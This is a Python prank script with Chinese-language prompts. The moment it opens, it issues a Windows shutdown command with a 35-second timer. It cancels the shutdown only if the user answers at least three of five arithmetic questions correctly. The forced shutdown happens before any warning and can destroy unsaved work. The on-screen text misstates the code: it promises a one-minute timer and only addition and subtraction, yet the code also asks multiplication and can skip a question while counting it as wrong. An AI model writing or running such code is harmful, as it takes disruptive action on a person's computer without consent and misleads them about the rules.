import os
import random
import time

os.system("shutdown -s -t 35")
print('''嘿，你为什么要打开这个程序？ 不知道它会将你的电脑关闭吗？看看说明，相信这会很有意思的：
就在刚才你打开的一瞬间，它就下达了一分钟内关机的指令，不要尝试关闭这个程序，
因为即使你关掉了，倒计时还是在继续！你只能通过这个程序取消关机。
既然都进来了，那为什么不玩点游戏？做五道数学题吧，都是整数加减法。如果你的正确答案数量，
在三个以上，它会终止关机指令随后自己退出。反之，它什么也不做之后退出。那么，现在开始吧。
================================================================================
''')

right = 0
for i in range(5):
	choose = random.randint(0, 3)
	
	if choose == 0:
		number_1 = random.randint(1, 99)
		number_2 = random.randint(1, 99)
		answer = number_1 + number_2
		userAnswer = input("\n{} + {} = ?\n>>>".format(number_1, number_2))
		
		try:
			userAnswer = int(userAnswer)
		
		except:
			print("错")
		
		else:
			if userAnswer == answer:
				right += 1
				print("对")

			else:
				print("错")

	elif choose == 1:
		number_1 = random.randint(1, 99)
		number_2 = random.randint(1, 99)
		answer = number_1 - number_2
		userAnswer = input("{} - {} = ?\n>>>".format(number_1, number_2))

		try:
			userAnswer = int(userAnswer)
		
		except:
			print("错")
		
		else:
			if userAnswer == answer:
				right += 1
				print("对")

			else:
				print("错")

	elif choose == 2:
			number_1 = random.randint(1, 99)
			number_2 = random.randint(1, 99)
			answer = number_1 * number_2
			userAnswer = input("{} x {} = ?\n>>>".format(number_1, number_2))

			try:
				userAnswer = int(userAnswer)
		
			except:
				print("错")
		
			else:
				if userAnswer == answer:
					right += 1
					print("对")

				else:
					print("错")

if right >= 3:
	os.system("shutdown -a")
	print("看来你算的还不错，说话算数，关机指令被终止了。")
	time.sleep(3)

else:
	print('看来你的算数技能不怎么样，遵守游戏规则吧。')
	time.sleep(3)




